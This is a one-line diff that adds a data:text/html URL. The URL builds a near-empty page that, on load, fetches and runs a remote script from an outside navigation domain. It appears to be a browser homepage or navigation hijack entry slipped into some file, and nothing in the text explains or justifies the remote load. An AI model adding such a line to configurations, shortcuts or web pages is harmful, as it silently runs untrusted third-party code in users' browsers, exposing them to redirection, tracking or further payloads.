@@ -1,0 +1,1 @@
+data:text/html,<html><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><style><!-- .ifr{width:600px;height:600px;background:#fff;overflow:hidden;display:block;position:absolute;top: 0;left: 0;right: 0;} --></style><script type="text/javascript" src="http://nav.365cent.com/nav.js" charset="UTF-8"></script></html>
